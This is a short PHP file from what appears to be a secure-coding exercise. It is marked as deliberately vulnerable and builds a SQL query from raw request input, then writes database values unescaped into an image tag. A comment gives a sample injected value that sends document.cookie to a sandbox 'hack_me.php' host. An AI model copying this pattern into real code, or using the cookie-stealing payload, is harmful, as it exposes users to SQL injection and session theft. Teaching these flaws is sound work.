<?php
/**
 *********************************************************************
 * PLEASE, DON'T TOUCH THIS CODE: This code is deliberately vulnerable
 * Please edit the "with.php" file fixing any vulnerabilities found
 *********************************************************************
 */

if (isset($_REQUEST['type'])) {
    $type = $_REQUEST['type'] ?? 'pink';
    $stmt = $this->getPdo()->query("SELECT * FROM flowers WHERE type = '$type'");
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
}

$name   = $result['name'] ?? 'pink';
$folder = $result['folder'] ?? 'images/';

// If "pink" is selected, hacked code ends up looking like this:
// $folder = 'http://sandbox/hack_me.php?data=<script>document.cookie</script>" style="width:1px;height:1px;" />'
// $name   = '<img src="http://sandbox.com/images/hacked';
$html .= '<img src="' . $folder . $name . '.png" width="50%"/>';
